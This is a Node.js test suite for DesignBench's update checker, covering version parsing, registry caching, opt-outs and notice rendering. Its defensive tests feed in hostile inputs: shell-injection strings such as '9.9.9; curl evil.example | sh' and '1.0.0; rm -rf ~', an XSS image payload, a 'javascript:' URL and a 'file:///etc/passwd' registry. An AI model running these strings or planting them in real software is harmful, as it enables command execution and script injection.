import test, { after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { checkForUpdate, formatUpdate, isNewer, registryUrl, updateCheckDisabled, updateCommand, userCacheDir } from '../cli/update.mjs';
import { startDev } from '../cli/dev.mjs';
import { Workbench } from '../dist/index.js';

// Dev servers started here keep their Vite cache out of the real per-user cache directory.
process.env.XDG_CACHE_HOME = await fs.mkdtemp(path.join(os.tmpdir(), 'designbench-cache-'));
after(() => fs.rm(process.env.XDG_CACHE_HOME, { recursive: true, force: true }));

/** A loopback stand-in for the npm registry that counts requests. */
async function registry(t, document, status = 200) {
  const state = { requests: 0, accept: '' };
  const server = http.createServer((req, res) => {
    state.requests++; state.accept = req.headers.accept; state.url = req.url;
    res.writeHead(status, { 'content-type': 'application/json' });
    res.end(typeof document === 'string' ? document : JSON.stringify(document));
  });
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  t.after(() => server.close());
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'designbench-update-'));
  t.after(() => fs.rm(dir, { recursive: true, force: true }));
  return { state, options: { registry: `http://127.0.0.1:${server.address().port}/`, cacheFile: path.join(dir, 'nested/update-check.json'), env: {} } };
}
const packument = (latest, versions = {}) => ({ name: 'designbench', 'dist-tags': { latest }, versions });

test('version comparison accepts only stable releases', () => {
  assert.equal(isNewer('0.4.0', '0.3.9'), true);
  assert.equal(isNewer('0.10.0', '0.9.0'), true);
  assert.equal(isNewer('1.0.0', '1.0.0'), false);
  assert.equal(isNewer('0.3.0', '0.4.0'), false);
  assert.equal(isNewer('1.0.0', '1.0.0-beta.1'), true);
  for (const unsafe of ['1.0.0-beta.1', '1.0', 'latest', '1.0.0; rm -rf ~', '$(id)', '', undefined]) assert.equal(isNewer(unsafe, '0.1.0'), false);
});

test('a newer release produces a notice and is cached for the day', async t => {
  const { state, options } = await registry(t, packument('0.9.0'));
  const notice = await checkForUpdate({ ...options, current: '0.4.0', now: 1_000 });
  assert.deepEqual({ current: notice.current, latest: notice.latest, deprecated: notice.deprecated }, { current: '0.4.0', latest: '0.9.0', deprecated: undefined });
  assert.match(notice.notesUrl, /^https:\/\/github\.com\/.*CHANGELOG\.md$/);
  assert.equal(state.url, '/designbench');
  assert.match(state.accept, /npm\.install-v1/);
  assert.equal((await checkForUpdate({ ...options, current: '0.4.0', now: 2_000 })).latest, '0.9.0');
  assert.equal(state.requests, 1, 'a second check within the interval reads the cache');
  await checkForUpdate({ ...options, current: '0.4.0', now: 1_000 + 25 * 60 * 60 * 1000 });
  assert.equal(state.requests, 2, 'the cache expires');
  await checkForUpdate({ ...options, current: '0.5.0', now: 3_000 });
  assert.equal(state.requests, 3, 'a different running version checks again');
  assert.equal((await fs.stat(options.cacheFile)).mode & 0o077, 0, 'the cache is private to the user');
});

test('an up-to-date or older registry says nothing', async t => {
  const same = await registry(t, packument('0.4.0'));
  assert.equal(await checkForUpdate({ ...same.options, current: '0.4.0' }), null);
  const older = await registry(t, packument('0.3.0'));
  assert.equal(await checkForUpdate({ ...older.options, current: '0.4.0' }), null);
});

test('a deprecated running version is reported with a sanitized message', async t => {
  const message = 'Security fix in 0.4.1.\n\u001b[31mUpgrade now ' + 'x'.repeat(500);
  const { options } = await registry(t, packument('0.4.1', { '0.4.0': { deprecated: message }, '0.4.1': {} }));
  const notice = await checkForUpdate({ ...options, current: '0.4.0' });
  assert.equal(notice.latest, '0.4.1');
  assert.match(notice.deprecated, /^Security fix in 0\.4\.1\. \[31mUpgrade now x+$/);
  assert.equal(notice.deprecated.length, 280);
  assert.doesNotMatch(notice.deprecated, /[\p{Cc}\p{Zl}\p{Zp}]/u);
  const withdrawn = await registry(t, packument('0.4.0', { '0.4.0': { deprecated: 'Do not use.' } }));
  assert.deepEqual(await checkForUpdate({ ...withdrawn.options, current: '0.4.0' }).then(x => [x.latest, x.deprecated]), [undefined, 'Do not use.']);
});

test('untrusted, failing, and slow registries never produce a notice or an error', async t => {
  for (const latest of ['9.9.9-beta.1', '9.9.9; curl evil.example | sh', '$(id)', 9, null, { toString: () => '9.9.9' }]) {
    const { options } = await registry(t, packument(latest));
    assert.equal(await checkForUpdate({ ...options, current: '0.4.0' }), null, String(latest));
  }
  for (const body of ['{}', 'null', '[]', '{"dist-tags":"9.9.9","versions":[]}']) {
    const { options } = await registry(t, body);
    assert.equal(await checkForUpdate({ ...options, current: '0.4.0' }), null, body);
  }
  for (const [body, status] of [['not json', 200], [packument('9.9.9'), 500], [packument('9.9.9'), 404]]) {
    const { options } = await registry(t, body, status);
    assert.equal(await checkForUpdate({ ...options, current: '0.4.0' }), null);
    await assert.rejects(fs.access(options.cacheFile), 'failures are not cached');
  }
  const slow = http.createServer(() => {});
  await new Promise(resolve => slow.listen(0, '127.0.0.1', resolve));
  t.after(() => { slow.closeAllConnections(); slow.close(); });
  const started = Date.now();
  assert.equal(await checkForUpdate({ registry: `http://127.0.0.1:${slow.address().port}/`, cacheFile: path.join(os.tmpdir(), `designbench-none-${process.pid}.json`), env: {}, current: '0.4.0', timeout: 150 }), null);
  assert.ok(Date.now() - started < 1500, 'a hung registry is abandoned at the timeout');
  assert.equal(await checkForUpdate({ registry: 'http://127.0.0.1:1/', cacheFile: path.join(os.tmpdir(), `designbench-none-${process.pid}.json`), env: {}, current: '0.4.0' }), null);
});

test('opt-outs skip the request entirely', async t => {
  const { state, options } = await registry(t, packument('9.9.9'));
  for (const name of ['DESIGNBENCH_NO_UPDATE_CHECK', 'NO_UPDATE_NOTIFIER', 'CI', 'npm_config_offline'])
    assert.equal(await checkForUpdate({ ...options, env: { [name]: '1' }, current: '0.4.0' }), null, name);
  assert.equal(state.requests, 0);
  assert.equal(updateCheckDisabled({ CI: 'true' }), true);
  assert.equal(updateCheckDisabled({ CI: 'false', DESIGNBENCH_NO_UPDATE_CHECK: '0' }), false);
  assert.equal(updateCheckDisabled({}), false);
});

test('the registry follows npm configuration but refuses plain HTTP off loopback', () => {
  assert.equal(registryUrl({}), 'https://registry.npmjs.org/');
  assert.equal(registryUrl({ npm_config_registry: 'https://npm.example.com/mirror' }), 'https://npm.example.com/mirror/');
  assert.equal(registryUrl({ npm_config_registry: 'http://npm.example.com/' }), 'https://registry.npmjs.org/');
  assert.equal(registryUrl({ npm_config_registry: 'http://localhost:4873/' }), 'http://localhost:4873/');
  assert.equal(registryUrl({ npm_config_registry: 'file:///etc/passwd' }), 'https://registry.npmjs.org/');
  assert.equal(registryUrl({ npm_config_registry: 'not a url' }), 'https://registry.npmjs.org/');
  assert.ok(path.isAbsolute(userCacheDir({})));
  assert.equal(userCacheDir({ XDG_CACHE_HOME: '/var/cache/me' }), path.join('/var/cache/me', 'designbench'));
  assert.ok(!userCacheDir({}).startsWith(os.tmpdir()), 'the cache is not in a shared temporary directory');
});

test('the suggested command matches how the project installed DesignBench', async t => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'designbench-command-'));
  t.after(() => fs.rm(root, { recursive: true, force: true }));
  assert.equal(await updateCommand(root, '0.9.0'), 'npx designbench@0.9.0 dev');
  await fs.mkdir(path.join(root, 'node_modules/.bin'), { recursive: true });
  await fs.writeFile(path.join(root, 'node_modules/.bin/designbench'), '');
  assert.equal(await updateCommand(root, '0.9.0'), 'npm install --save-dev designbench@0.9.0');
  await fs.writeFile(path.join(root, 'yarn.lock'), '');
  assert.equal(await updateCommand(root, '0.9.0'), 'yarn add -D designbench@0.9.0');
  await fs.writeFile(path.join(root, 'pnpm-lock.yaml'), '');
  assert.equal(await updateCommand(root, '0.9.0'), 'pnpm add -D designbench@0.9.0');
  assert.equal(await updateCommand(root, '0.9.0 && curl evil.example'), undefined);
  const text = formatUpdate({ current: '0.4.0', latest: '0.9.0', command: 'npx designbench@0.9.0 dev', notesUrl: 'https://example.com/notes' });
  assert.match(text, /DesignBench 0\.9\.0 is available \(running 0\.4\.0\)/);
  assert.match(text, /npx designbench@0\.9\.0 dev/);
  assert.match(text, /DESIGNBENCH_NO_UPDATE_CHECK=1/);
  assert.match(formatUpdate({ current: '0.4.0', deprecated: 'Do not use.' }), /^Warning: designbench@0\.4\.0 is deprecated: Do not use\.$/);
});

test('the dev server hands the shell its version and any notice without a network request', async t => {
  const root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), 'designbench-dev-update-')));
  t.after(() => fs.rm(root, { recursive: true, force: true }));
  await fs.writeFile(path.join(root, 'package.json'), JSON.stringify({ name: 'host' }));
  const version = JSON.parse(await fs.readFile(new URL('../package.json', import.meta.url), 'utf8')).version;
  const quiet = await startDev(root, { port: 0 });
  t.after(() => quiet.close());
  const plain = (await quiet.transformRequest('virtual:design-workbench')).code;
  assert.ok(plain.includes(`export const version = ${JSON.stringify(version)};`));
  assert.match(plain, /export const update = null;/);
  await quiet.close();
  const notice = { current: version, latest: '99.0.0', command: 'npx designbench@99.0.0 dev', notesUrl: 'https://example.com/notes' };
  const noisy = await startDev(root, { port: 0, update: Promise.resolve(notice) });
  t.after(() => noisy.close());
  assert.ok((await noisy.transformRequest('virtual:design-workbench')).code.includes(`export const update = ${JSON.stringify(notice)};`));
  await noisy.close();
  const failing = await startDev(root, { port: 0, update: Promise.reject(new Error('offline')) });
  t.after(() => failing.close());
  assert.match((await failing.transformRequest('virtual:design-workbench')).code, /export const update = null;/);
  await failing.close();
});

test('the shell shows a quiet update notice, a loud deprecation, and nothing by default', () => {
  const entry = { id: 'button', name: 'Button', group: 'Controls', source: 'Button.tsx', description: 'A generic button', variants: ['Default'], width: 400 };
  const props = { project: 'Fixture', projectId: 'fixture', basePath: '/design', entries: [entry] };
  const render = extra => renderToStaticMarkup(createElement(Workbench, { ...props, ...extra }));
  const none = render({});
  assert.doesNotMatch(none, /Update available|deprecated|DesignBench \d/);
  assert.match(render({ version: '0.4.0' }), /DesignBench 0\.4\.0 · Local preview/);
  const available = render({ version: '0.4.0', update: { current: '0.4.0', latest: '0.9.0', command: 'npx designbench@0.9.0 dev', notesUrl: 'https://example.com/notes' } });
  assert.match(available, /Update available/);
  assert.match(available, /0\.9\.0/);
  assert.doesNotMatch(available, /role="alert"/);
  const deprecated = render({ update: { current: '0.4.0', latest: '0.4.1', deprecated: '<img src=x onerror=alert(1)> Security fix.', command: 'npm install --save-dev designbench@0.4.1', notesUrl: 'javascript:alert(1)' } });
  assert.match(deprecated, /role="alert"/);
  assert.match(deprecated, /DesignBench 0\.4\.0 is deprecated\./);
  assert.match(deprecated, /&lt;img src=x onerror=alert\(1\)&gt; Security fix\./);
  assert.match(deprecated, /npm install --save-dev designbench@0\.4\.1/);
  assert.match(deprecated, /Copy command/);
  assert.doesNotMatch(deprecated, /javascript:|What’s new|Update available/);
  assert.doesNotMatch(render({ update: { current: '0.4.0' } }), /Update available|role="alert"/);
});
